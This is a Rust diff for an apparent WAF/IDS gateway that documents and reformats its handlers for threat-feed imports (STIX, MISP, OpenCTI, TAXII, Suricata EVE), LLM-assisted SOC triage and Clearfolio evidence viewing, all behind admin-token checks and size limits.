@@ -457,6 +457,8 @@ const KEV_DEFAULT_SOURCE: &str = "feed:cisa-kev";
 const KEV_DEFAULT_URL: &str =
     "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json";
 const KEV_DEFAULT_TTL_SECONDS: u64 = 86_400;
+// Runtime fetches stay fixed to the official CISA endpoint. Loopback remains
+// allowed so integration tests can point AppState at a local mock server.
 const KEV_ALLOWED_HOSTS: &[&str] = &["www.cisa.gov"];
 
 fn kev_default_feed_id() -> String {
@@ -542,6 +544,12 @@ pub fn export_events_ndjson(events: &[SecurityEvent]) -> Result<String, serde_js
     Ok(out)
 }
 
+// ---- Clearfolio document-viewer integration -------------------------------
+// The admin console can hand live SOC evidence to the Clearfolio viewer:
+// submit the document (plain text) to Clearfolio's async convert API, then embed
+// the resulting `/viewer/{docId}` iframe. Submit + status are thin single-call
+// proxies; the browser polls status and drives the iframe (no server-side loop).
+
 fn clearfolio_submit_url(base: &str) -> String {
     format!("{}/api/v1/convert/jobs", base.trim_end_matches('/'))
 }
@@ -561,6 +569,9 @@ fn clearfolio_tenant_headers(config: &ClearfolioConfig) -> [(&'static str, &str)
     ]
 }
 
+/// Renders a waf-ids document to plain-text bytes for Clearfolio ingest.
+/// Clearfolio only blocks `hwp`/`hwpx`, so text uploads convert normally.
+/// Returns `(filename, bytes)` or `None` for an unknown kind.
 fn clearfolio_document(kind: &str, data: &AppData) -> Option<(String, Vec<u8>)> {
     let (name, text) = match kind {
         "evidence-manifest" => (
@@ -591,6 +602,8 @@ struct ClearfolioConfigView {
     kinds: [&'static str; 2],
 }
 
+/// Reports whether the Clearfolio viewer is configured and its base URL, so the
+/// admin console can build viewer iframes. The base URL is not a secret.
 async fn clearfolio_config(State(state): State<AppState>) -> Json<ClearfolioConfigView> {
     let base_url = state.clearfolio.as_ref().map(|c| c.base_url.clone());
     Json(ClearfolioConfigView {
@@ -600,6 +613,8 @@ async fn clearfolio_config(State(state): State<AppState>) -> Json<ClearfolioConf
     })
 }
 
+/// Submits a live waf-ids document to Clearfolio for conversion and relays the
+/// async job envelope (`jobId`, `status`, `statusUrl`) back to the console.
 async fn clearfolio_submit(
     State(state): State<AppState>,
     PathParam(kind): PathParam<String>,
@@ -645,6 +660,8 @@ async fn clearfolio_submit(
     }
 }
 
+/// Proxies one Clearfolio job-status read (tenant headers applied server-side),
+/// so the browser can poll conversion progress without holding the credentials.
 async fn clearfolio_status(
     State(state): State<AppState>,
     PathParam(job_id): PathParam<String>,
@@ -674,6 +691,13 @@ async fn clearfolio_status(
     }
 }
 
+// ---- LLM-backed SOC analysis ----------------------------------------------
+// Hands a recorded security event to an OpenAI-compatible chat endpoint (the
+// contextual-orchestrator gateway) for analyst-style triage. Single call; the
+// request/response shaping is pure and unit-tested, the HTTP glue is thin.
+
+/// Builds an OpenAI `/v1/chat/completions` request body that asks for concise
+/// SOC triage of one security event.
 fn soc_llm_chat_body(model: &str, event: &SecurityEvent) -> serde_json::Value {
     let client_ip = event
         .client_ip
@@ -696,6 +720,7 @@ fn soc_llm_chat_body(model: &str, event: &SecurityEvent) -> serde_json::Value {
     })
 }
 
+/// Extracts the assistant message text from an OpenAI-compatible chat response.
 fn soc_llm_extract_content(body: &serde_json::Value) -> Option<String> {
     body.get("choices")?
         .get(0)?
@@ -711,6 +736,8 @@ struct SocLlmConfigView {
     model: Option<String>,
 }
 
+/// Reports whether LLM SOC analysis is configured (and which model), so the
+/// admin console can show or hide the analysis surface.
 async fn soc_llm_config(State(state): State<AppState>) -> Json<SocLlmConfigView> {
     let model = state.soc_llm.as_ref().map(|c| c.model.clone());
     Json(SocLlmConfigView {
@@ -776,6 +803,8 @@ struct SocAnalyzeResponse {
     analysis: String,
 }
 
+/// Analyzes one recorded security event with the configured LLM and returns the
+/// analyst summary. Admin-authorized; the event is looked up by id.
 async fn soc_analyze(
     State(state): State<AppState>,
     headers: HeaderMap,
@@ -845,6 +874,7 @@ async fn healthz(State(state): State<AppState>) -> Json<HealthStatus> {
     Json(state.health_status())
 }
 
+/// Build/version metadata for deployment verification.
 async fn version() -> Json<serde_json::Value> {
     Json(serde_json::json!({
         "name": env!("CARGO_PKG_NAME"),
@@ -852,6 +882,8 @@ async fn version() -> Json<serde_json::Value> {
     }))
 }
 
+/// Kubernetes readiness probe: distinct from `/healthz` (liveness), it reports
+/// whether the gateway is configured to serve — i.e. has an enabled route.
 async fn readyz(State(state): State<AppState>) -> Response {
     let routes_enabled = {
         let data = state.inner.read().await;
@@ -988,6 +1020,8 @@ struct EventQuery {
     limit: Option<usize>,
 }
 
+/// Lists security events, optionally filtered by `action` and capped to the most
+/// recent `limit` (chronological order preserved) for SOC triage.
 async fn list_events(
     State(state): State<AppState>,
     Query(query): Query<EventQuery>,
@@ -1010,6 +1044,8 @@ async fn list_events(
 }
 
 async fn list_audit_logs(State(state): State<AppState>, headers: HeaderMap) -> Response {
+    // Audit logs are operator-sensitive: any valid admin principal may read
+    // (including readonly); unauthenticated callers are rejected when auth is on.
     if !admin_authenticated(&state, &headers) {
         return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
     }
@@ -1043,6 +1079,8 @@ struct EvaluateResponse {
     would_block: bool,
 }
 
+/// Scores a synthetic request against the current detection state without
+/// proxying it, so operators can test payloads and tune rules offline.
 async fn evaluate_request(
     State(state): State<AppState>,
     Json(request): Json<EvaluateRequest>,
@@ -1156,6 +1194,7 @@ async fn import_threat_feed(
     }
 }
 
+/// Optional STIX import metadata via query string.
 #[derive(Debug, Deserialize)]
 struct StixImportQuery {
     #[serde(default = "stix_default_feed_id")]
@@ -1166,9 +1205,15 @@ struct StixImportQuery {
     ttl_seconds: u64,
 }
 
-fn stix_default_feed_id() -> String { "stix-import".to_string() }
-fn stix_default_source() -> String { "stix".to_string() }
-fn stix_default_ttl_seconds() -> u64 { 86_400 }
+fn stix_default_feed_id() -> String {
+    "stix-import".to_string()
+}
+fn stix_default_source() -> String {
+    "stix".to_string()
+}
+fn stix_default_ttl_seconds() -> u64 {
+    86_400
+}
 
 #[derive(Debug, Serialize)]
 struct StixImportResult {
@@ -1179,318 +1224,1682 @@ struct StixImportResult {
     last_updated_unix: u64,
 }
 
+/// Ingest a STIX 2.x indicator or bundle (JSON body). Admin-auth only.
+/// Query: `feed_id`, `source`, `ttl_seconds` (defaults: stix-import / stix / 86400).
 async fn import_stix_document(
     State(state): State<AppState>,
     headers: HeaderMap,
     Query(query): Query<StixImportQuery>,
     body: Bytes,
 ) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() { return error(StatusCode::BAD_REQUEST, "feed_id and source must be non-empty"); }
-    if query.ttl_seconds == 0 { return error(StatusCode::BAD_REQUEST, "ttl_seconds must be greater than 0"); }
-    let body_text = match std::str::from_utf8(&body) { Ok(text) => text, Err(_) => return error(StatusCode::BAD_REQUEST, "STIX body must be UTF-8 text") };
-    let material = match stix_import::parse_stix_document(body_text, query.source.trim(), query.ttl_seconds) { Ok(material) => material, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "feed_id and source must be non-empty",
+        );
+    }
+    if query.ttl_seconds == 0 {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "ttl_seconds must be greater than 0",
+        );
+    }
+    let body_text = match std::str::from_utf8(&body) {
+        Ok(text) => text,
+        Err(_) => return error(StatusCode::BAD_REQUEST, "STIX body must be UTF-8 text"),
+    };
+    let material =
+        match stix_import::parse_stix_document(body_text, query.source.trim(), query.ttl_seconds) {
+            Ok(material) => material,
+            Err(message) => return error(StatusCode::BAD_REQUEST, message),
+        };
+
     let actor = audit_actor(&state, &headers);
-    let feed = ThreatFeedImport { feed_id: query.feed_id.trim().to_string(), source: query.source.trim().to_string(), ttl_seconds: query.ttl_seconds, threats: material.threats, dnsbl: material.dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_REQUEST, message); }
+    let feed = ThreatFeedImport {
+        feed_id: query.feed_id.trim().to_string(),
+        source: query.source.trim().to_string(),
+        ttl_seconds: query.ttl_seconds,
+        threats: material.threats,
+        dnsbl: material.dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
     let skipped_objects = material.skipped_objects;
     match apply_threat_feed_import(&state, actor, "import_stix_document", feed).await {
-        Ok(result) => (StatusCode::CREATED, Json(StixImportResult { feed_id: result.feed_id, upserted_threats: result.upserted_threats, upserted_dnsbl: result.upserted_dnsbl, skipped_objects, last_updated_unix: result.last_updated_unix })).into_response(),
+        Ok(result) => (
+            StatusCode::CREATED,
+            Json(StixImportResult {
+                feed_id: result.feed_id,
+                upserted_threats: result.upserted_threats,
+                upserted_dnsbl: result.upserted_dnsbl,
+                skipped_objects,
+                last_updated_unix: result.last_updated_unix,
+            }),
+        )
+            .into_response(),
         Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
     }
 }
 
+/// Optional MISP import metadata via query string.
 #[derive(Debug, Deserialize)]
-struct MispImportQuery { #[serde(default = "misp_default_feed_id")] feed_id: String, #[serde(default = "misp_default_source")] source: String, #[serde(default = "misp_default_ttl_seconds")] ttl_seconds: u64 }
-fn misp_default_feed_id() -> String { "misp-import".to_string() }
-fn misp_default_source() -> String { "misp".to_string() }
-fn misp_default_ttl_seconds() -> u64 { 86_400 }
-#[derive(Debug, Serialize)]
-struct MispImportResult { feed_id: String, upserted_threats: usize, upserted_dnsbl: usize, skipped_attributes: usize, last_updated_unix: u64 }
+struct MispImportQuery {
+    #[serde(default = "misp_default_feed_id")]
+    feed_id: String,
+    #[serde(default = "misp_default_source")]
+    source: String,
+    #[serde(default = "misp_default_ttl_seconds")]
+    ttl_seconds: u64,
+}
 
-async fn import_misp_document(State(state): State<AppState>, headers: HeaderMap, Query(query): Query<MispImportQuery>, body: Bytes) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() { return error(StatusCode::BAD_REQUEST, "feed_id and source must be non-empty"); }
-    if query.ttl_seconds == 0 { return error(StatusCode::BAD_REQUEST, "ttl_seconds must be greater than 0"); }
-    let body_text = match std::str::from_utf8(&body) { Ok(text) => text, Err(_) => return error(StatusCode::BAD_REQUEST, "MISP body must be UTF-8 text") };
-    let material = match misp_import::parse_misp_document(body_text, query.source.trim(), query.ttl_seconds) { Ok(material) => material, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
+fn misp_default_feed_id() -> String {
+    "misp-import".to_string()
+}
+fn misp_default_source() -> String {
+    "misp".to_string()
+}
+fn misp_default_ttl_seconds() -> u64 {
+    86_400
+}
+
+#[derive(Debug, Serialize)]
+struct MispImportResult {
+    feed_id: String,
+    upserted_threats: usize,
+    upserted_dnsbl: usize,
+    skipped_attributes: usize,
+    last_updated_unix: u64,
+}
+
+/// Ingest a MISP event/attribute export (JSON body). Admin-auth only.
+/// Query: `feed_id`, `source`, `ttl_seconds` (defaults: misp-import / misp / 86400).
+async fn import_misp_document(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    Query(query): Query<MispImportQuery>,
+    body: Bytes,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "feed_id and source must be non-empty",
+        );
+    }
+    if query.ttl_seconds == 0 {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "ttl_seconds must be greater than 0",
+        );
+    }
+    let body_text = match std::str::from_utf8(&body) {
+        Ok(text) => text,
+        Err(_) => return error(StatusCode::BAD_REQUEST, "MISP body must be UTF-8 text"),
+    };
+    let material =
+        match misp_import::parse_misp_document(body_text, query.source.trim(), query.ttl_seconds) {
+            Ok(material) => material,
+            Err(message) => return error(StatusCode::BAD_REQUEST, message),
+        };
+
     let actor = audit_actor(&state, &headers);
-    let feed = ThreatFeedImport { feed_id: query.feed_id.trim().to_string(), source: query.source.trim().to_string(), ttl_seconds: query.ttl_seconds, threats: material.threats, dnsbl: material.dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_REQUEST, message); }
+    let feed = ThreatFeedImport {
+        feed_id: query.feed_id.trim().to_string(),
+        source: query.source.trim().to_string(),
+        ttl_seconds: query.ttl_seconds,
+        threats: material.threats,
+        dnsbl: material.dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
     let skipped_attributes = material.skipped_attributes;
     match apply_threat_feed_import(&state, actor, "import_misp_document", feed).await {
-        Ok(result) => (StatusCode::CREATED, Json(MispImportResult { feed_id: result.feed_id, upserted_threats: result.upserted_threats, upserted_dnsbl: result.upserted_dnsbl, skipped_attributes, last_updated_unix: result.last_updated_unix })).into_response(),
+        Ok(result) => (
+            StatusCode::CREATED,
+            Json(MispImportResult {
+                feed_id: result.feed_id,
+                upserted_threats: result.upserted_threats,
+                upserted_dnsbl: result.upserted_dnsbl,
+                skipped_attributes,
+                last_updated_unix: result.last_updated_unix,
+            }),
+        )
+            .into_response(),
         Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
     }
 }
 
+/// Optional OpenCTI import metadata via query string.
 #[derive(Debug, Deserialize)]
-struct OpenCtiImportQuery { #[serde(default = "opencti_default_feed_id")] feed_id: String, #[serde(default = "opencti_default_source")] source: String, #[serde(default = "opencti_default_ttl_seconds")] ttl_seconds: u64 }
-fn opencti_default_feed_id() -> String { "opencti-import".to_string() }
-fn opencti_default_source() -> String { "opencti".to_string() }
-fn opencti_default_ttl_seconds() -> u64 { 86_400 }
-#[derive(Debug, Serialize)]
-struct OpenCtiImportResult { feed_id: String, upserted_threats: usize, upserted_dnsbl: usize, skipped_objects: usize, last_updated_unix: u64 }
+struct OpenCtiImportQuery {
+    #[serde(default = "opencti_default_feed_id")]
+    feed_id: String,
+    #[serde(default = "opencti_default_source")]
+    source: String,
+    #[serde(default = "opencti_default_ttl_seconds")]
+    ttl_seconds: u64,
+}
 
-async fn import_opencti_document(State(state): State<AppState>, headers: HeaderMap, Query(query): Query<OpenCtiImportQuery>, body: Bytes) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() { return error(StatusCode::BAD_REQUEST, "feed_id and source must be non-empty"); }
-    if query.ttl_seconds == 0 { return error(StatusCode::BAD_REQUEST, "ttl_seconds must be greater than 0"); }
-    let body_text = match std::str::from_utf8(&body) { Ok(text) => text, Err(_) => return error(StatusCode::BAD_REQUEST, "OpenCTI body must be UTF-8 text") };
-    let material = match opencti_import::parse_opencti_document(body_text, query.source.trim(), query.ttl_seconds) { Ok(material) => material, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
+fn opencti_default_feed_id() -> String {
+    "opencti-import".to_string()
+}
+fn opencti_default_source() -> String {
+    "opencti".to_string()
+}
+fn opencti_default_ttl_seconds() -> u64 {
+    86_400
+}
+
+#[derive(Debug, Serialize)]
+struct OpenCtiImportResult {
+    feed_id: String,
+    upserted_threats: usize,
+    upserted_dnsbl: usize,
+    skipped_objects: usize,
+    last_updated_unix: u64,
+}
+
+/// Ingest an OpenCTI observable/indicator export (JSON body). Admin-auth only.
+/// Query: `feed_id`, `source`, `ttl_seconds` (defaults: opencti-import / opencti / 86400).
+async fn import_opencti_document(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    Query(query): Query<OpenCtiImportQuery>,
+    body: Bytes,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if query.feed_id.trim().is_empty() || query.source.trim().is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "feed_id and source must be non-empty",
+        );
+    }
+    if query.ttl_seconds == 0 {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "ttl_seconds must be greater than 0",
+        );
+    }
+    let body_text = match std::str::from_utf8(&body) {
+        Ok(text) => text,
+        Err(_) => {
+            return error(StatusCode::BAD_REQUEST, "OpenCTI body must be UTF-8 text");
+        }
+    };
+    let material = match opencti_import::parse_opencti_document(
+        body_text,
+        query.source.trim(),
+        query.ttl_seconds,
+    ) {
+        Ok(material) => material,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+
     let actor = audit_actor(&state, &headers);
-    let feed = ThreatFeedImport { feed_id: query.feed_id.trim().to_string(), source: query.source.trim().to_string(), ttl_seconds: query.ttl_seconds, threats: material.threats, dnsbl: material.dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_REQUEST, message); }
+    let feed = ThreatFeedImport {
+        feed_id: query.feed_id.trim().to_string(),
+        source: query.source.trim().to_string(),
+        ttl_seconds: query.ttl_seconds,
+        threats: material.threats,
+        dnsbl: material.dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
     let skipped_objects = material.skipped_objects;
     match apply_threat_feed_import(&state, actor, "import_opencti_document", feed).await {
-        Ok(result) => (StatusCode::CREATED, Json(OpenCtiImportResult { feed_id: result.feed_id, upserted_threats: result.upserted_threats, upserted_dnsbl: result.upserted_dnsbl, skipped_objects, last_updated_unix: result.last_updated_unix })).into_response(),
+        Ok(result) => (
+            StatusCode::CREATED,
+            Json(OpenCtiImportResult {
+                feed_id: result.feed_id,
+                upserted_threats: result.upserted_threats,
+                upserted_dnsbl: result.upserted_dnsbl,
+                skipped_objects,
+                last_updated_unix: result.last_updated_unix,
+            }),
+        )
+            .into_response(),
         Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
     }
 }
 
+/// TAXII 2.1 collection poll request (admin-auth).
+/// Provide either `objects_url` or (`api_root` + `collection_id`).
 #[derive(Debug, Deserialize)]
 struct TaxiiPollRequest {
-    #[serde(default)] objects_url: Option<String>, #[serde(default)] api_root: Option<String>, #[serde(default)] collection_id: Option<String>,
-    #[serde(default = "taxii_default_feed_id")] feed_id: String, #[serde(default = "taxii_default_source")] source: String, #[serde(default = "taxii_default_ttl_seconds")] ttl_seconds: u64,
-    #[serde(default)] added_after: Option<String>, #[serde(default)] bearer_token: Option<String>, #[serde(default)] username: Option<String>, #[serde(default)] password: Option<String>,
+    #[serde(default)]
+    objects_url: Option<String>,
+    #[serde(default)]
+    api_root: Option<String>,
+    #[serde(default)]
+    collection_id: Option<String>,
+    #[serde(default = "taxii_default_feed_id")]
+    feed_id: String,
+    #[serde(default = "taxii_default_source")]
+    source: String,
+    #[serde(default = "taxii_default_ttl_seconds")]
+    ttl_seconds: u64,
+    /// Optional ISO-8601 timestamp filter (`added_after` TAXII query param).
+    #[serde(default)]
+    added_after: Option<String>,
+    #[serde(default)]
+    bearer_token: Option<String>,
+    #[serde(default)]
+    username: Option<String>,
+    #[serde(default)]
+    password: Option<String>,
 }
-fn taxii_default_feed_id() -> String { "taxii-import".to_string() }
-fn taxii_default_source() -> String { "taxii".to_string() }
-fn taxii_default_ttl_seconds() -> u64 { 86_400 }
-#[derive(Debug, Serialize)]
-struct TaxiiPollResult { feed_id: String, objects_url: String, upserted_threats: usize, upserted_dnsbl: usize, skipped_objects: usize, last_updated_unix: u64 }
 
-async fn poll_taxii_collection(State(state): State<AppState>, headers: HeaderMap, Json(request): Json<TaxiiPollRequest>) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if request.feed_id.trim().is_empty() || request.source.trim().is_empty() { return error(StatusCode::BAD_REQUEST, "feed_id and source must be non-empty"); }
-    if request.ttl_seconds == 0 { return error(StatusCode::BAD_REQUEST, "ttl_seconds must be greater than 0"); }
-    let base_url = match resolve_taxii_objects_url(&request) { Ok(url) => url, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
-    if let Err(message) = validate_http_url(&base_url, true) { return error(StatusCode::BAD_REQUEST, format!("invalid TAXII objects URL: {message}")); }
-    let objects_url = match taxii::with_taxii_filters(&base_url, request.added_after.as_deref()) { Ok(url) => url, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
-    let body_text = match fetch_taxii_objects(&state, &objects_url, request.bearer_token.as_deref(), request.username.as_deref(), request.password.as_deref()).await { Ok(body) => body, Err(message) => return error(StatusCode::BAD_GATEWAY, message) };
-    let stix_json = match taxii::stix_json_from_taxii_response(&body_text) { Ok(json) => json, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
-    let material = match stix_import::parse_stix_document(&stix_json, request.source.trim(), request.ttl_seconds) { Ok(material) => material, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
+fn taxii_default_feed_id() -> String {
+    "taxii-import".to_string()
+}
+fn taxii_default_source() -> String {
+    "taxii".to_string()
+}
+fn taxii_default_ttl_seconds() -> u64 {
+    86_400
+}
+
+#[derive(Debug, Serialize)]
+struct TaxiiPollResult {
+    feed_id: String,
+    objects_url: String,
+    upserted_threats: usize,
+    upserted_dnsbl: usize,
+    skipped_objects: usize,
+    last_updated_unix: u64,
+}
+
+/// Poll a TAXII 2.1 collection objects endpoint and import STIX indicators.
+/// Secrets in the request body are never written to audit logs.
+async fn poll_taxii_collection(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    Json(request): Json<TaxiiPollRequest>,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if request.feed_id.trim().is_empty() || request.source.trim().is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "feed_id and source must be non-empty",
+        );
+    }
+    if request.ttl_seconds == 0 {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "ttl_seconds must be greater than 0",
+        );
+    }
+
+    let base_url = match resolve_taxii_objects_url(&request) {
+        Ok(url) => url,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+    if let Err(message) = validate_http_url(&base_url, /* allow_non_default_hosts */ true) {
+        return error(
+            StatusCode::BAD_REQUEST,
+            format!("invalid TAXII objects URL: {message}"),
+        );
+    }
+    let objects_url = match taxii::with_taxii_filters(&base_url, request.added_after.as_deref()) {
+        Ok(url) => url,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+
+    let body_text = match fetch_taxii_objects(
+        &state,
+        &objects_url,
+        request.bearer_token.as_deref(),
+        request.username.as_deref(),
+        request.password.as_deref(),
+    )
+    .await
+    {
+        Ok(body) => body,
+        Err(message) => return error(StatusCode::BAD_GATEWAY, message),
+    };
+
+    let stix_json = match taxii::stix_json_from_taxii_response(&body_text) {
+        Ok(json) => json,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+    let material = match stix_import::parse_stix_document(
+        &stix_json,
+        request.source.trim(),
+        request.ttl_seconds,
+    ) {
+        Ok(material) => material,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+
     let actor = audit_actor(&state, &headers);
-    let feed = ThreatFeedImport { feed_id: request.feed_id.trim().to_string(), source: request.source.trim().to_string(), ttl_seconds: request.ttl_seconds, threats: material.threats, dnsbl: material.dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_REQUEST, message); }
+    let feed = ThreatFeedImport {
+        feed_id: request.feed_id.trim().to_string(),
+        source: request.source.trim().to_string(),
+        ttl_seconds: request.ttl_seconds,
+        threats: material.threats,
+        dnsbl: material.dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
     let skipped_objects = material.skipped_objects;
     match apply_threat_feed_import(&state, actor, "poll_taxii_collection", feed).await {
-        Ok(result) => (StatusCode::CREATED, Json(TaxiiPollResult { feed_id: result.feed_id, objects_url: base_url, upserted_threats: result.upserted_threats, upserted_dnsbl: result.upserted_dnsbl, skipped_objects, last_updated_unix: result.last_updated_unix })).into_response(),
+        Ok(result) => (
+            StatusCode::CREATED,
+            Json(TaxiiPollResult {
+                feed_id: result.feed_id,
+                objects_url: base_url,
+                upserted_threats: result.upserted_threats,
+                upserted_dnsbl: result.upserted_dnsbl,
+                skipped_objects,
+                last_updated_unix: result.last_updated_unix,
+            }),
+        )
+            .into_response(),
         Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
     }
 }
 
 fn resolve_taxii_objects_url(request: &TaxiiPollRequest) -> Result<String, String> {
-    if let Some(url) = request.objects_url.as_deref().map(str::trim).filter(|s| !s.is_empty()) { return Ok(url.to_string()); }
-    let api_root = request.api_root.as_deref().map(str::trim).filter(|s| !s.is_empty());
-    let collection_id = request.collection_id.as_deref().map(str::trim).filter(|s| !s.is_empty());
-    match (api_root, collection_id) { (Some(root), Some(id)) => taxii::collection_objects_url(root, id), _ => Err("provide objects_url or both api_root and collection_id for TAXII poll".to_string()) }
+    if let Some(url) = request
+        .objects_url
+        .as_deref()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+    {
+        return Ok(url.to_string());
+    }
+    let api_root = request
+        .api_root
+        .as_deref()
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    let collection_id = request
+        .collection_id
+        .as_deref()
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    match (api_root, collection_id) {
+        (Some(root), Some(id)) => taxii::collection_objects_url(root, id),
+        _ => {
+            Err("provide objects_url or both api_root and collection_id for TAXII poll".to_string())
+        }
+    }
 }
 
-async fn fetch_taxii_objects(state: &AppState, url: &str, bearer_token: Option<&str>, username: Option<&str>, password: Option<&str>) -> Result<String, String> {
+async fn fetch_taxii_objects(
+    state: &AppState,
+    url: &str,
+    bearer_token: Option<&str>,
+    username: Option<&str>,
+    password: Option<&str>,
+) -> Result<String, String> {
     use futures_util::StreamExt;
-    let mut request = state.feed_http.get(url).header("Accept", "application/taxii+json;version=2.1, application/stix+json;version=2.1, application/json").timeout(std::time::Duration::from_secs(PHISHING_DATABASE_FETCH_TIMEOUT_SECS));
-    if let Some(token) = bearer_token.map(str::trim).filter(|s| !s.is_empty()) { request = request.bearer_auth(token); } else if let Some(user) = username.map(str::trim).filter(|s| !s.is_empty()) { request = request.basic_auth(user, password); }
-    let response = request.send().await.map_err(|error| format!("failed to poll TAXII collection: {error}"))?;
-    let status = response.status(); if !status.is_success() { return Err(format!("TAXII server returned HTTP {status}")); }
-    if let Some(len) = response.content_length() && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("TAXII response body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})")); }
-    let mut bytes = Vec::new(); let mut stream = response.bytes_stream();
-    while let Some(chunk) = stream.next().await { let chunk = chunk.map_err(|error| format!("failed to read TAXII body: {error}"))?; if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("TAXII response body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming")); } bytes.extend_from_slice(&chunk); }
+
+    let mut request = state
+        .feed_http
+        .get(url)
+        .header(
+            "Accept",
+            "application/taxii+json;version=2.1, application/stix+json;version=2.1, application/json",
+        )
+        .timeout(std::time::Duration::from_secs(
+            PHISHING_DATABASE_FETCH_TIMEOUT_SECS,
+        ));
+
+    if let Some(token) = bearer_token.map(str::trim).filter(|s| !s.is_empty()) {
+        request = request.bearer_auth(token);
+    } else if let Some(user) = username.map(str::trim).filter(|s| !s.is_empty()) {
+        request = request.basic_auth(user, password);
+    }
+
+    let response = request
+        .send()
+        .await
+        .map_err(|error| format!("failed to poll TAXII collection: {error}"))?;
+    let status = response.status();
+    if !status.is_success() {
+        return Err(format!("TAXII server returned HTTP {status}"));
+    }
+    if let Some(len) = response.content_length()
+        && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES
+    {
+        return Err(format!(
+            "TAXII response body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})"
+        ));
+    }
+    let mut bytes = Vec::new();
+    let mut stream = response.bytes_stream();
+    while let Some(chunk) = stream.next().await {
+        let chunk = chunk.map_err(|error| format!("failed to read TAXII body: {error}"))?;
+        if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES {
+            return Err(format!(
+                "TAXII response body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming"
+            ));
+        }
+        bytes.extend_from_slice(&chunk);
+    }
     String::from_utf8(bytes).map_err(|error| format!("TAXII response is not valid UTF-8: {error}"))
 }
 
+/// Ingest Suricata EVE JSON (single object, array, or NDJSON). Admin-auth only.
+/// Maps `event_type=alert` records into gateway security events for SOC export.
 #[derive(Debug, Serialize)]
-struct SuricataEveImportResult { accepted_alerts: usize, skipped_non_alerts: usize, event_ids: Vec<u64>, enforcement_hints: usize }
-
-async fn import_suricata_eve(State(state): State<AppState>, headers: HeaderMap, body: Bytes) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    let body_text = match std::str::from_utf8(&body) { Ok(text) => text, Err(_) => return error(StatusCode::BAD_REQUEST, "Suricata EVE body must be UTF-8 text") };
